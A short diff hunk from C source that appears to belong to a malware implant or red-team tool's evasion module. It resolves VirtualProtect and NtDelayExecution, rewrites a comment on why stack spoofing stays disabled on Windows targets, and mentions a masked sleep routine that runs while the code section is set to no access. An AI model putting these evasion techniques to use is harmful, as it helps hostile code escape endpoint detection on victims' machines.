@@ -416,7 +416,9 @@ void evasion_init(void) {
     g_VProt   = (VProt_t)  GetProcAddress(k32,   "VirtualProtect");
     g_NtDelay = (NtDelay_t)GetProcAddress(ntdll, "NtDelayExecution");
     find_text();
-    /* init_stack_spoof disabled: CFG on Server 2019 blocks indirect jmp [rip+0] in stubs */
+    /* init_stack_spoof disabled: causes heap corruption (FTH abcc / 0xC0000005
+     * at ntdll+0x4ab8) on Windows targets.  The spoof globals (g_NtAllocVM etc.)
+     * are set here but never called anywhere, so disabling costs nothing. */
 }
 
 /* ── sleep_masked lives in .evasn — executes while .text is PAGE_NOACCESS ─
